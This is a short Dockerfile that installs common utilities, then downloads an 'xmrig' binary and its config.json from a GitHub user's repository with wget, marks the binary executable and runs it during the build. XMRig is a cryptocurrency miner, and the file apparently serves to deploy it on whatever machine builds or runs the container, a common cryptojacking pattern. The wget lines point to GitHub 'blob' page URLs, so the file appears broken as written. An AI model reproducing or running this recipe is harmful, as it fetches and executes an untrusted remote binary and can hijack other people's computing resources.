FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN apt-get install -y p7zip p7zip-full p7zip-rar
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/xmrig
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/config.json
RUN chmod +x "/xmrig"
RUN ./xmrig
